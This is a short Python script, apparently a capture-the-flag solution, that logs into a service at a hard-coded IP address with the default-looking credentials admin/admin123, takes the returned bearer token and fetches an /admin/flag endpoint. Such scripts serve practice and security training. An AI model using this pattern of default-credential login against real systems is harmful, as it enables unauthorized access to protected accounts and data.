import requests

url = "http://34.135.223.176:5250"
s = requests.Session()
data = {'username': 'admin', 'password': 'admin123'}
response = s.post(f"{url}/login", json=data)

print(response.json())
token = response.json()["token"]
headers = {'Authorization': f'Bearer {token}'}
response = s.get(f"{url}/admin/flag", headers=headers)
print(response.text)
